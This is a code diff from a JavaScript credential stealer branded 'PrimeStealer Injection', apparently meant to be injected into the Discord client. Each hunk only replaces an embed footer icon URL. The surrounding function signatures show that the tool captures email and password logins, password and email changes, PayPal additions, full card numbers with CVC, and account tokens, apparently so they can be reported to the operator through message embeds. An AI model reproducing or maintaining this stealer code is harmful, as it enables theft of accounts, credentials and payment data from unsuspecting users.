@@ -681,7 +681,7 @@ const login = async (email, password, token) => {
         },
         footer: {
             text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
-            icon_url: "https://media.discordapp.net/attachments/1119323047120355422/1223810398541713530/prime_2.png?ex=661b3540&is=6608c040&hm=3d525e9"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -724,7 +724,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
             text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
-            icon_url: "https://media.discordapp.net/attachments/1119323047120355422/1223810398541713530/prime_2.png?ex=661b3540&is=6608c040&hm=3d525e9"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -767,7 +767,7 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
             text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
-            icon_url: "https://media.discordapp.net/attachments/1119323047120355422/1223810398541713530/prime_2.png?ex=661b3540&is=6608c040&hm=3d525e9"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -810,7 +810,7 @@ const PaypalAdded = async (token) => {
         },
         footer: {
             text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
-            icon_url: "https://media.discordapp.net/attachments/1119323047120355422/1223810398541713530/prime_2.png?ex=661b3540&is=6608c040&hm=3d525e9"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -853,7 +853,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         footer: {
             text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
-            icon_url: "https://media.discordapp.net/attachments/1119323047120355422/1223810398541713530/prime_2.png?ex=661b3540&is=6608c040&hm=3d525e9"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
@@ -898,7 +898,7 @@ const nitroBought = async (token) => {
         },
         footer: {
             text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
-            icon_url: "https://media.discordapp.net/attachments/1119323047120355422/1223810398541713530/prime_2.png?ex=661b3540&is=6608c040&hm=3d525e9"
+            icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
     ],
